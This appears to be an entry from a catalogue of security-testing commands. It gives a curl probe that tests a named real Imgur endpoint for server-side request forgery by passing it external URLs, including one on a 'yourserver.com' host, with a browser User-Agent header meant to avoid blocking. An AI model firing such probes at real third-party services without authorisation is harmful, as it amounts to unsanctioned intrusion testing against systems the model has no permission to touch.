---
id: cmd-curl-probe-001
data: >-
  curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - probe
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.686Z'
verified: false
validated: true
submitted: true
---
# curl-basic-probe

## Command

```bash
curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command probes the Imgur endpoint with a basic external URL to test for SSRF by checking if the server fetches the URL without validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `url=...` | Target URL parameter | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid blocking | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt"
```

### Advanced Usage

```bash
curl -X GET "https://i.imgur.com/vidgif/url?url=https://yourserver.com/test.txt" -H "Accept: */*" -v
```

## Expected Output

HTTP response from Imgur, such as 200 OK with processing details, indicating the URL was accepted server-side.

## Related

- [[Related Procedure]]
